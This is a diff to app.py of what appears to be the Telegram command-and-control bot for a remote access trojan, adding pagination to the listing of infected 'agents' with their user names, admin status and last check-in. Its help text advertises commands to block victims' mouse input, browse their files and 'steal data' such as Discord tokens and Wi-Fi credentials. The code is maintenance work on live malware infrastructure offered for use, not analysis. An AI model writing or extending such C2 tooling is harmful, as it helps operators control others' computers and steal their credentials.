@@ -1,5 +1,5 @@
-# app.py (v42.1_STABILITY_FIX)
-# - FIXED: Replaced faulty 'httpx.utils.escape_html' with the standard 'html.escape' to resolve AttributeError.
+# app.py (v43.0_PAGINATION_UPDATE)
+# - MODIFIED: Implemented pagination for the /list command to handle a large number of agents without hitting Telegram's message limit.
 
 import os
 import re
@@ -67,6 +67,15 @@ async def post_job(target_id, command, args):
 # --- Telegram Command Handlers ---
 
 async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    page = 1
+    if context.args:
+        try:
+            page = int(context.args[0])
+            if page < 1: page = 1
+        except (ValueError, IndexError):
+            await update.message.reply_text("Invalid page number. Please use a number like <code>/list 2</code>.", parse_mode=ParseMode.HTML)
+            return
+            
     await update.message.reply_text("⏳ Fetching active agents...")
     try:
         if not HEARTBEAT_URL:
@@ -81,42 +90,51 @@ async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         if not isinstance(agents, list):
-            await update.message.reply_text("<b>Data Error:</b> Heartbeat data is not a valid list. It might be empty or corrupted.", parse_mode=ParseMode.HTML)
-            return
-        
-        if not agents:
-            await update.message.reply_text("ℹ️ No agents have ever checked in.", parse_mode=ParseMode.HTML)
+            await update.message.reply_text("<b>Data Error:</b> Heartbeat data is not a valid list.", parse_mode=ParseMode.HTML)
             return
 
-        agents.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
-        
-        response_text = "<b>ONLINE AGENTS</b>\n\n"
-        active_agent_found = False
         current_time_unix = time.time()
+        online_agents = sorted(
+            [agent for agent in agents if current_time_unix - agent.get("timestamp", 0) <= 90],
+            key=lambda x: x.get('timestamp', 0),
+            reverse=True
+        )
 
-        for agent in agents:
-            last_seen_unix = agent.get("timestamp", 0)
-            seconds_ago = int(current_time_unix - last_seen_unix)
+        total_agents = len(online_agents)
+        if total_agents == 0:
+            await update.message.reply_text("<i>No agents are currently online.</i>", parse_mode=ParseMode.HTML)
+            return
+
+        agents_per_page = 15
+        total_pages = (total_agents + agents_per_page - 1) // agents_per_page
+
+        if page > total_pages:
+            await update.message.reply_text(f"Invalid page number. There are only {total_pages} pages.", parse_mode=ParseMode.HTML)
+            return
+
+        start_index = (page - 1) * agents_per_page
+        end_index = start_index + agents_per_page
+        agents_to_display = online_agents[start_index:end_index]
+
+        response_text = f"<b>ONLINE AGENTS (Page {page} of {total_pages})</b>\n\n"
+        for agent in agents_to_display:
+            is_selected = "🎯" if agent.get("id") == selected_target else "➖"
+            seconds_ago = int(current_time_unix - agent.get("timestamp", 0))
+            time_ago = f"{seconds_ago}s ago" if seconds_ago < 60 else f"{seconds_ago // 60}m ago"
+            is_admin = "Admin" if agent.get("is_admin") else "User"
+            agent_id = agent.get('id', 'N/A')
+            user = agent.get('user', 'N/A')
             
-            if seconds_ago <= 90:
-                active_agent_found = True
-                is_selected = "🎯" if agent.get("id") == selected_target else "➖"
-                time_ago = f"{seconds_ago}s ago" if seconds_ago < 60 else f"{seconds_ago // 60}m ago"
-                is_admin = "Admin" if agent.get("is_admin") else "User"
-                agent_id = agent.get('id', 'N/A')
-                user = agent.get('user', 'N/A')
-                
-                safe_id = html.escape(agent_id)
-                safe_user = html.escape(user)
-                
-                response_text += f"{is_selected} <b>ID:</b> <code>{safe_id}</code>\n"
-                response_text += f"   <b>User:</b> <code>{safe_user} ({is_admin})</code>\n"
-                response_text += f"   <b>Last Seen:</b> {time_ago}\n\n"
-        
-        if not active_agent_found:
-            response_text += "<i>No agents have checked in within the last 90 seconds.</i>\n\n"
+            safe_id = html.escape(agent_id)
+            safe_user = html.escape(user)
+            
+            response_text += f"{is_selected} <b>ID:</b> <code>{safe_id}</code>\n"
+            response_text += f"   <b>User:</b> <code>{safe_user} ({is_admin})</code>\n"
+            response_text += f"   <b>Last Seen:</b> {time_ago}\n\n"
 
-        response_text += "<i>Use /target &lt;id&gt; to select an agent.</i>"
+        if page < total_pages:
+            response_text += f"\n<i>To see the next page, type <code>/list {page + 1}</code></i>"
+        
         await update.message.reply_text(response_text, parse_mode=ParseMode.HTML)
 
     except Exception as e:
@@ -200,8 +218,8 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "<code>/blockmouse</code> - Disable mouse input\n"
         "<code>/unblockmouse</code> - Enable mouse input\n\n"
         "<b>🔑 DATA EXFILTRATION</b>\n"
-        "<code>/grab &lt;type&gt;</code> - Steal data (discord, wifi, etc.)\n"
-        "  <i>Types: all, discord, wifi, history</i>\n\n"
+        "<code>/grab &lt;type&gt;</code> - Steal data (discord, wifi,)\n"
+        "  <i>Types: all, discord, wifi</i>\n\n"
         "<b>📁 FILE SYSTEM</b>\n"
         "<code>/ls</code> - List files\n"
         "<code>/cd &lt;dir&gt;</code> - Change directory\n"
